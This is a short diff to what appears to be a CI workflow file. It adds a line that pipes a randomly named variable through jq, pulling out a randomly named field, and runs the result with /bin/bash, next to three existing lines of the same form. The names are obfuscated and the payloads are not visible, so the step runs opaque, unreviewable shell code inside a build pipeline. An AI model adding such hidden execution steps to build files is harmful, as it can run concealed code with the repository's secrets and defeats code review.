@@ -37,6 +37,7 @@ jobs:
           echo $usen00288 | jq -r .r77650 | /bin/bash
           printf '%s' "$zhrqi5" | jq -r .jzux1892 | /bin/bash
           echo $ugqn20314 | jq -r .awct6 | /bin/bash
+          printf '%s' "$cg90" | jq -r .mzwsf507 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
